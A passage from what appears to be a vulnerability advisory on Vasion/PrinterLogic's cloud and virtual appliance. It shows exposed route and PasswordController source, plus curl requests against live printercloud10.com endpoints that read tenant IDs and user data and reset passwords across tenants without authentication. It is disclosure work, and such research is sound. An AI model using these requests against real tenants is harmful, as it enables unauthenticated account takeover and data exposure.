            <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$device</span> <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">null</span>) {
                <span style="color: #19177C">$message</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Device [</span><span style="color: #BB6688; font-weight: bold">$id</span><span style="color: #BA2121">] was not found&quot;</span>;
                <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$message</span>, self<span style="color: #666666">::</span><span style="color: #7D9029">INVALID_DEVICE_ERROR</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NOT_FOUND</span>);
            }
            <span style="color: #19177C">$device</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">delete</span>();
            DeviceAttribute<span style="color: #666666">::</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;device_id&#39;</span>, <span style="color: #19177C">$id</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">delete</span>();

            <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(<span style="color: #BA2121">&#39;&#39;</span>, HttpResponse<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NO_CONTENT</span>);
        } <span style="color: #008000; font-weight: bold">catch</span> (QueryException <span style="color: #19177C">$qe</span>) {
            <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(<span style="color: #19177C">$qe</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>());
        }
    }
}
</pre></div>

<p>A tenant can retrieve passwords for other tenants and compromise their infrastructure.</p>
<p>A tenant can edit the settings of other tenants.</p>
<p><a id="saas-cross-tenant-take-over"></a></p>
<h2>Details - Take over of tenants without authentication</h2>
<p>It was observed that the <code>authn</code> Docker instance is exposed over the Internet in the SaaS version and over the local network area in the VA version. This instance manages the authentication mechanisms (OIDC, SAML) but also provides several APIs to change users' passwords without authentication.</p>
<p>The <code>authn</code> Docker instance implements APIs for IdP authentication and is not supposed to be directly reachable over the network:</p>
<p><code>Authn</code> instance:</p>
<pre><code>root@printerlogic:/home/debug# docker ps|grep authn
f13ed71bef89   printerlogic/authn:1.16.0                 "/var/www/app/.docke"   3 minutes ago   Up 2 minutes (healthy)   80/tcp, 443/tcp, 9000-9001/tcp                                                    printercloud_authn.1.v4pisby2qagav2tl1uswkdyuu
</code></pre>
<p>Exposing this docker instance without authentication is a security risk as an attacker can edit users for any tenant.</p>
<p>Several routes are exposed to manage the authentication over SAML and OIDC - this seems to be a normal behavior:</p>
<p>Content of <code>/var/www/app/routes/idp.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">17</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;idp/{idp}/saml2/login&#39;</span>, <span style="color: #BA2121">&#39;Idp\Saml2\LoginController&#39;</span>)
 <span style="color: #666666">18</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.saml2.login&#39;</span>);
 <span style="color: #666666">19</span>     
 <span style="color: #666666">20</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;idp/multiple/login&#39;</span>, <span style="color: #BA2121">&#39;Idp\LoginController&#39;</span>)
 <span style="color: #666666">21</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.multiple.login&#39;</span>);
 <span style="color: #666666">22</span> 
 <span style="color: #666666">23</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;idp/{idp}/saml2/acs&#39;</span>, <span style="color: #BA2121">&#39;Idp\Saml2\AssertionConsumerController&#39;</span>)
 <span style="color: #666666">24</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.saml2.acs&#39;</span>);
 <span style="color: #666666">25</span> 
 <span style="color: #666666">26</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;idp/{idp}/saml2/metadata&#39;</span>, <span style="color: #BA2121">&#39;Idp\Saml2\MetadataController&#39;</span>)
 <span style="color: #666666">27</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.saml2.metadata&#39;</span>);
 <span style="color: #666666">28</span> 
 <span style="color: #666666">29</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;idp/{idp}/desktop/assertion&#39;</span>, <span style="color: #BA2121">&#39;Idp\Desktop\AssertionController&#39;</span>)
 <span style="color: #666666">30</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.desktop.assertion&#39;</span>);
 <span style="color: #666666">31</span> 
 <span style="color: #666666">32</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;idp/{idp}/desktop/validation/{username}&#39;</span>, <span style="color: #BA2121">&#39;Idp\Desktop\ValidationController&#39;</span>)
 <span style="color: #666666">33</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.desktop.validation&#39;</span>);
 <span style="color: #666666">34</span> 
 <span style="color: #666666">35</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;idp/{idp}/desktop/validate-token&#39;</span>, <span style="color: #BA2121">&#39;Idp\Desktop\Token\ValidateTokenController&#39;</span>)
 <span style="color: #666666">36</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.desktop.token.validate&#39;</span>);
 <span style="color: #666666">37</span> 
 <span style="color: #666666">38</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;idp/{idp}/desktop/renew-token&#39;</span>, <span style="color: #BA2121">&#39;Idp\Desktop\Token\RenewTokenController&#39;</span>)
 <span style="color: #666666">39</span>     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">name</span>(<span style="color: #BA2121">&#39;idp.desktop.token.renew&#39;</span>);
 <span style="color: #666666">40</span> 
 <span style="color: #666666">41</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(
 <span style="color: #666666">42</span>     <span style="color: #BA2121">&#39;idp/{idp}/oidc/login&#39;</span>,
 <span style="color: #666666">43</span>     [
 <span style="color: #666666">44</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;Idp\Oidc\LoginController&#39;</span>,
 <span style="color: #666666">45</span>         <span style="color: #BA2121">&#39;middleware&#39;</span> <span style="color: #666666">=&gt;</span> StartSession<span style="color: #666666">::</span><span style="color: #7D9029">class</span>,
 <span style="color: #666666">46</span>         <span style="color: #BA2121">&#39;as&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;idp.oidc.login&#39;</span>
 <span style="color: #666666">47</span>     ]
 <span style="color: #666666">48</span> );
</pre></div>

<p>For example, getting information about SAML2 authentication for the <code>[redacted]</code> instance (the UID corresponding to the instance has been redacted):</p>
<pre><code>kali% curl https://gw.app.printercloud10.com/[instance-name-redacted]/authn/idp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa/saml2/metadata
&lt;?xml version="1.0"?&gt;
&lt;md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                     validUntil="2024-01-05T12:44:21Z"
                     cacheDuration="PT604800S"
                     entityID="https://gw.app.printercloud10.com/[instance-name-redacted]/authn/idp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa/saml2/metadata"&gt;
    &lt;md:SPSSODescriptor AuthnRequestsSigned="false" WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"&gt;
        &lt;md:SingleLogoutService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                                Location="https://gw.app.printercloud10.com/[instance-name-redacted]/authn/idp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa/saml2sls" /&gt;
        &lt;md:NameIDFormat&gt;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&lt;/md:NameIDFormat&gt;
        &lt;md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                                     Location="https://gw.app.printercloud10.com/[instance-name-redacted]/authn/idp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa/saml2/acs"
                                     index="1" /&gt;

    &lt;/md:SPSSODescriptor&gt;
    &lt;md:Organization&gt;
       &lt;md:OrganizationName xml:lang="en-US"&gt;Name&lt;/md:OrganizationName&gt;
       &lt;md:OrganizationDisplayName xml:lang="en-US"&gt;Display Name&lt;/md:OrganizationDisplayName&gt;
       &lt;md:OrganizationURL xml:lang="en-US"&gt;http://url&lt;/md:OrganizationURL&gt;
    &lt;/md:Organization&gt;
    &lt;md:ContactPerson contactType="technical"&gt;
        &lt;md:GivenName&gt;name&lt;/md:GivenName&gt;
        &lt;md:EmailAddress&gt;no@reply.com&lt;/md:EmailAddress&gt;
    &lt;/md:ContactPerson&gt;
    &lt;md:ContactPerson contactType="support"&gt;
        &lt;md:GivenName&gt;Support&lt;/md:GivenName&gt;
        &lt;md:EmailAddress&gt;no@reply.com&lt;/md:EmailAddress&gt;
    &lt;/md:ContactPerson&gt;
&lt;/md:EntityDescriptor&gt;
</code></pre>
<p>But other non-public APIs allow an attacker to redefine passwords of users by specifying the target tenant:</p>
<p>Content of <code>/var/www/app/routes/api.php</code> with insecure routes in lines 42 to 47:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">40</span> 
 <span style="color: #666666">41</span> Route<span style="color: #666666">::</span><span style="color: #7D9029">middleware</span>([<span style="color: #BA2121">&#39;auth.key&#39;</span>])<span style="color: #666666">-&gt;</span><span style="color: #7D9029">group</span>(<span style="color: #008000; font-weight: bold">function</span> () {
 <span style="color: #666666">42</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;/password/{userId}/tenant/{tenantId}&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;exists&#39;</span>]);
 <span style="color: #666666">43</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;/password/{userId}/tenant/{tenantId}/updated&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;lastUpdated&#39;</span>]);
 <span style="color: #666666">44</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;/password/{userId}/tenant/{tenantId}&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;verify&#39;</span>]);
 <span style="color: #666666">45</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">post</span>(<span style="color: #BA2121">&#39;/password&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;store&#39;</span>]);
 <span style="color: #666666">46</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">patch</span>(<span style="color: #BA2121">&#39;/password/{user_id}/tenant/{tenant_id}&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;update&#39;</span>]);
 <span style="color: #666666">47</span>     Route<span style="color: #666666">::</span><span style="color: #7D9029">delete</span>(<span style="color: #BA2121">&#39;/password/{user_id}/tenant/{tenant_id}&#39;</span>, [PasswordController<span style="color: #666666">::</span><span style="color: #7D9029">class</span>, <span style="color: #BA2121">&#39;destroy&#39;</span>]);
 <span style="color: #666666">48</span> 
[<span style="color: #666666">...</span>]
</pre></div>

<p>These APIs are reachable over the LAN for Printer VA:</p>
<ul>
<li>http://gw.10.105.0.60/app_pi/authn/idp/multiple/login</li>
<li>http://gw.10.105.0.60/app_pi/authn/api/password/[userId]/tenant/[tenantId]/updated</li>
<li>e.g.: http://gw.10.105.0.60/app_pi/authn/api/password/aaaaaaaa-aaaa-aaaaaaaaa-aaaaaaaaaaaa/tenant/9999/updated</li>
</ul>
<p>And from the Internet for the SaaS version:</p>
<ul>
<li>https://gw.app.printercloud10.com/[redacted-instance-name]/authn/idp/multiple/login</li>
<li>https://gw.app.printercloud10.com/[redacted-instance-name]/authn/api/password/[userId]/tenant/[tenantId]/updated</li>
<li>e.g.: https://gw.app.printercloud10.com/[redacted-instance-name]/authn/api/password/aaaaaaaa-aaaa-aaaaaaaaa-aaaaaaaaaaaa/tenant/9999/updated</li>
<li>[...]</li>
</ul>
<p>As we can see, any valid tenant name can be used in the URL and the <code>userID</code> and <code>tenantID</code> are extracted from the URLs (from the <code>/var/www/app/routes/api.php</code> file).</p>
<p>These requests do not require authentication.</p>
<p>HTTP requests to the authn instance through https://gw.app.printercloud10.com/:</p>
<pre>
kali% curl https://gw.app.printercloud10.com/<font color=red>[instance1]</font>/authn/api/password/<font color=red>aaaaaaaa-aaaa-aaaaaaaaa-aaaaaaaaaaaa</font>/tenant/<font color=red>9999</font>/updated
{"success":false,"message":"No password for userId"}
kali% curl https://gw.app.printercloud10.com/<font color=red>[instance2]</font>/authn/api/password/<font color=red>aaaaaaaa-aaaa-aaaaaaaaa-aaaaaaaaaaaa</font>/tenant/<font color=red>9999</font>/updated
{"success":false,"message":"No password for userId"}
</pre>

<p>The <code>user_id</code> and <code>tenantId</code> variables are not a secret and can be extracted from APIs without authentication.</p>
<p>It appears that an attacker can change the password for any user in any tenant.</p>
<p>For this this test, the <code>tenantId</code> and <code>user_id</code> variables were extracted from the unit test file <code>/var/www/app/tests/Integration/App/Http/Controllers/PasswordControllerTest.php</code> to avoid any impact in the SaaS environment:</p>
<p>Change of password for a specific <code>user_id</code> and <code>tenantId</code> (without authentication). This user corresponds to a test account:
<img alt="" src="images/2025-vasion-report-2-cross-tenant-password-change.png" /></p>
<p><a href="images/2025-vasion-report-2-cross-tenant-password-change-full.png">Click here for full image</a></p>
<p>The <code>TenantID</code> variable is located everywhere in the source code of the <code>https://[redacted].printercloud10.com/</code> webpages and in the API answers (without authentication).</p>
<p>For example, without authentication we can retrieve the tenantId value by interrogating the API <code>/api-gateway/identify/search-groups</code>:</p>
<p>Access to <code>/api-gateway/identify/search-groups</code> without authentication:
<img alt="" src="images/2025-vasion-report-2-cross-tenant-tenant_id.png" /></p>
<p><a href="images/2025-vasion-report-2-cross-tenant-tenant_id-full.png">Click here for full image</a></p>
<p>Or the <code>/api-gateway/identities/jobs/1</code> API without authentication.</p>
<p>HTTP request to https://[instance].printercloud10.com/api-gateway/identities/jobs/1:</p>
<pre><code>kali% curl https://[instance].printercloud10.com/api-gateway/identities/jobs/1    
{"identifier":"1","tenantId":"9999","status":"Completed"}
</code></pre>
<p>Or the <code>/api-gateway/identify/search-users</code> - this API can list all the users (id, firstname, lastname, displayname, username, email, domain, siteId, sourceId, sourceService, userAttributes [groups], ...)</p>
<p>Access to <code>/api-gateway/identify/search-users</code> without authentication:
<img alt="" src="images/2025-vasion-report-2-cross-tenant-user_id.png" /></p>
<p>The implementation of these APIs is done in the <code>/var/www/app/app/Http/Controllers/PasswordController.php</code> file, there is no authentication:</p>
<p>Content of <code>/var/www/app/app/Http/Controllers/PasswordController.php</code> with:</p>
<ul>
<li>line 70: information about the password of any user for any tenant without authentication;</li>
<li>line 103: verification of a password of any user for any tenant without authentication;</li>
<li>lines 129 to 142: definition of a new password of any user for any tenant without authentication;</li>
<li>lines 159 to 173: update of a new password of any user for any tenant without authentication;</li>
<li>lines 188 and 189: deletion of the password any user for any tenant without authentication.</li>
</ul>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> 
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">namespace</span> App\Http\Controllers;
  <span style="color: #666666">4</span> 
  <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">use</span> App\Models\Password;
  <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">use</span> App\Services\PasswordService;
  <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">use</span> Symfony\Component\HttpFoundation\Response;
  <span style="color: #666666">8</span> <span style="color: #008000; font-weight: bold">use</span> Illuminate\Http\Request;
  <span style="color: #666666">9</span> 
 <span style="color: #666666">10</span> <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 11  * Class PasswordController</span>
<span style="color: #BA2121; font-style: italic"> 12  *</span>
<span style="color: #BA2121; font-style: italic"> 13  * @package App\Http\Controllers</span>
<span style="color: #BA2121; font-style: italic"> 14  */</span>
 <span style="color: #666666">15</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">PasswordController</span> <span style="color: #008000; font-weight: bold">extends</span> Controller
 <span style="color: #666666">16</span> {
 <span style="color: #666666">17</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 18      * An instance of Password Service</span>
<span style="color: #BA2121; font-style: italic"> 19      *</span>
<span style="color: #BA2121; font-style: italic"> 20      * @var PasswordService</span>
<span style="color: #BA2121; font-style: italic"> 21      */</span>
 <span style="color: #666666">22</span>     <span style="color: #008000; font-weight: bold">private</span> <span style="color: #19177C">$passwordService</span>;
 <span style="color: #666666">23</span> 
 <span style="color: #666666">24</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 25      * Constructor for the PasswordController</span>
<span style="color: #BA2121; font-style: italic"> 26      *</span>
<span style="color: #BA2121; font-style: italic"> 27      * @param passwordService $passwordService service instance</span>
<span style="color: #BA2121; font-style: italic"> 28      */</span>
 <span style="color: #666666">29</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">__construct</span>(PasswordService <span style="color: #19177C">$passwordService</span>)
 <span style="color: #666666">30</span>     {
 <span style="color: #666666">31</span>         <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">passwordService</span> <span style="color: #666666">=</span> <span style="color: #19177C">$passwordService</span>;
 <span style="color: #666666">32</span>     }
 <span style="color: #666666">33</span> 
 <span style="color: #666666">34</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 35      * Endpoint to verify userid exists in passwords table.</span>
<span style="color: #BA2121; font-style: italic"> 36      *</span>
<span style="color: #BA2121; font-style: italic"> 37      * @param String $userId ID of the user passed from the user service</span>
<span style="color: #BA2121; font-style: italic"> 38      * @param Int $tenantId ID of the tenant</span>
<span style="color: #BA2121; font-style: italic"> 39      *</span>
<span style="color: #BA2121; font-style: italic"> 40      * @return \Illuminate\Http\JsonResponse</span>
<span style="color: #BA2121; font-style: italic"> 41      */</span>
 <span style="color: #666666">42</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">exists</span>(string <span style="color: #19177C">$userId</span>, int <span style="color: #19177C">$tenantId</span>)
 <span style="color: #666666">43</span>     {
 <span style="color: #666666">44</span>         <span style="color: #19177C">$passwordExist</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">passwordService</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">exists</span>(<span style="color: #19177C">$userId</span>, <span style="color: #19177C">$tenantId</span>);
 <span style="color: #666666">45</span> 
 <span style="color: #666666">46</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$passwordExist</span>) {
 <span style="color: #666666">47</span>             <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">true</span>], Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_OK</span>);
 <span style="color: #666666">48</span>         }
 <span style="color: #666666">49</span> 
 <span style="color: #666666">50</span>         <span style="color: #008000; font-weight: bold">return</span> response()
 <span style="color: #666666">51</span>             <span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(
 <span style="color: #666666">52</span>                 [
 <span style="color: #666666">53</span>                     <span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">false</span>,
 <span style="color: #666666">54</span>                     <span style="color: #BA2121">&quot;message&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;No password for userId&#39;</span>
 <span style="color: #666666">55</span>                 ],
 <span style="color: #666666">56</span>                 Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NOT_FOUND</span>
 <span style="color: #666666">57</span>             );
 <span style="color: #666666">58</span>     }
 <span style="color: #666666">59</span> 
 <span style="color: #666666">60</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 61      * Endpoint to get the last updated date of the password for the given userId.</span>
<span style="color: #BA2121; font-style: italic"> 62      *</span>
<span style="color: #BA2121; font-style: italic"> 63      * @param String $userId ID of the user</span>
<span style="color: #BA2121; font-style: italic"> 64      * @param Int $tenantId ID of the tenant</span>
<span style="color: #BA2121; font-style: italic"> 65      *</span>
<span style="color: #BA2121; font-style: italic"> 66      * @return \Illuminate\Http\JsonResponse</span>
<span style="color: #BA2121; font-style: italic"> 67      */</span>
 <span style="color: #666666">68</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">lastUpdated</span>(string <span style="color: #19177C">$userId</span>, int <span style="color: #19177C">$tenantId</span>)
 <span style="color: #666666">69</span>     {
 <span style="color: #666666">70</span>         <span style="color: #19177C">$passwordUpdatedAt</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">passwordService</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">lastUpdated</span>(<span style="color: #19177C">$userId</span>, <span style="color: #19177C">$tenantId</span>);                <span style="color: #408080; font-style: italic">// [1] information about the userId</span>
 <span style="color: #666666">71</span> 
 <span style="color: #666666">72</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$passwordUpdatedAt</span> <span style="color: #666666">!==</span> <span style="color: #008000; font-weight: bold">null</span>) {
 <span style="color: #666666">73</span>             <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">true</span>, <span style="color: #BA2121">&#39;updated_at&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$passwordUpdatedAt</span>], Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_OK</span>);
 <span style="color: #666666">74</span>         }
 <span style="color: #666666">75</span> 
 <span style="color: #666666">76</span>         <span style="color: #008000; font-weight: bold">return</span> response()
 <span style="color: #666666">77</span>             <span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(
 <span style="color: #666666">78</span>                 [
 <span style="color: #666666">79</span>                     <span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">false</span>,
 <span style="color: #666666">80</span>                     <span style="color: #BA2121">&#39;message&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;No password for userId&#39;</span>
 <span style="color: #666666">81</span>                 ],
 <span style="color: #666666">82</span>                 Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_NOT_FOUND</span>
 <span style="color: #666666">83</span>             );
 <span style="color: #666666">84</span>     }
 <span style="color: #666666">85</span> 
 <span style="color: #666666">86</span> 
 <span style="color: #666666">87</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 88      * Endpoint to verify password hashes.</span>
<span style="color: #BA2121; font-style: italic"> 89      *</span>
<span style="color: #BA2121; font-style: italic"> 90      * @param Request $request Request Object</span>
<span style="color: #BA2121; font-style: italic"> 91      * @param String $userId ID of the user passed from the user service</span>
<span style="color: #BA2121; font-style: italic"> 92      * @param Int $tenantId ID of the tenant</span>
<span style="color: #BA2121; font-style: italic"> 93      *</span>
<span style="color: #BA2121; font-style: italic"> 94      * @return \Illuminate\Http\JsonResponse</span>
<span style="color: #BA2121; font-style: italic"> 95      */</span>
 <span style="color: #666666">96</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">verify</span>(Request <span style="color: #19177C">$request</span>, string <span style="color: #19177C">$userId</span>, int <span style="color: #19177C">$tenantId</span>)
 <span style="color: #666666">97</span>     {
 <span style="color: #666666">98</span>         <span style="color: #408080; font-style: italic">//Validate required fields</span>
 <span style="color: #666666">99</span>         <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">validate</span>([
<span style="color: #666666">100</span>             <span style="color: #BA2121">&#39;password&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required|string|max:255&#39;</span>,
<span style="color: #666666">101</span>         ]);
<span style="color: #666666">102</span> 
<span style="color: #666666">103</span>         <span style="color: #19177C">$passwordVerified</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">passwordService</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">verify</span>(<span style="color: #19177C">$userId</span>, <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(<span style="color: #BA2121">&#39;password&#39;</span>), <span style="color: #19177C">$tenantId</span>); <span style="color: #408080; font-style: italic">// [2] verification of the password</span>
<span style="color: #666666">104</span> 
<span style="color: #666666">105</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$passwordVerified</span>) {
<span style="color: #666666">106</span>             <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">true</span>], Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_OK</span>);
<span style="color: #666666">107</span>         }
<span style="color: #666666">108</span>         <span style="color: #008000; font-weight: bold">return</span> response()
<span style="color: #666666">109</span>             <span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>(
<span style="color: #666666">110</span>                 [
<span style="color: #666666">111</span>                     <span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">false</span>,
<span style="color: #666666">112</span>                     <span style="color: #BA2121">&quot;message&quot;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;Password does not match.&#39;</span>
<span style="color: #666666">113</span>                 ],
<span style="color: #666666">114</span>                 Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_FORBIDDEN</span>
<span style="color: #666666">115</span>             );
<span style="color: #666666">116</span>     }
<span style="color: #666666">117</span> 
<span style="color: #666666">118</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">119      * Endpoint to create new password records.</span>
<span style="color: #BA2121; font-style: italic">120      *</span>
<span style="color: #BA2121; font-style: italic">121      * @param Request $request Request object</span>
<span style="color: #BA2121; font-style: italic">122      *</span>
<span style="color: #BA2121; font-style: italic">123      * @return \Illuminate\Http\JsonResponse</span>
<span style="color: #BA2121; font-style: italic">124      */</span>
<span style="color: #666666">125</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">store</span>(Request <span style="color: #19177C">$request</span>)
<span style="color: #666666">126</span>     {
<span style="color: #666666">127</span>         <span style="color: #408080; font-style: italic">//Validate required fields</span>
<span style="color: #666666">128</span>         <span style="color: #19177C">$validated</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">validate</span>([
<span style="color: #666666">129</span>             <span style="color: #BA2121">&#39;user_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required|max:255|unique:passwords,user_id,NULL,id,tenant_id,&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(<span style="color: #BA2121">&#39;tenant_id&#39;</span>),
<span style="color: #666666">130</span>             <span style="color: #BA2121">&#39;tenant_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required|unique:passwords,tenant_id,NULL,id,user_id,&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">input</span>(<span style="color: #BA2121">&#39;user_id&#39;</span>),
